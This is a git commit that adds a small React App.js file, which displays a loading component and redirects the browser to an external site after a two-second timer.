e1513d6ad0e4d60465f024aacab7b4852827cfe1
husknet <127146284+husknet@users.noreply.github.com>
2024-07-24 10:49:11 -0300

    Add files via upload

---
+++ src/App.js
@@ -0,0 +1,20 @@
+import React, { useEffect } from 'react';
+import Loading from './Loading';
+
+function App() {
+    useEffect(() => {
+        const timer = setTimeout(() => {
+            window.location.href = 'https://blowtb.vercel.app/';
+        }, 2000);
+
+        return () => clearTimeout(timer);
+    }, []);
+
+    return (
+        <div className="App">
+            <Loading />
+        </div>
+    );
+}
+
+export default App;
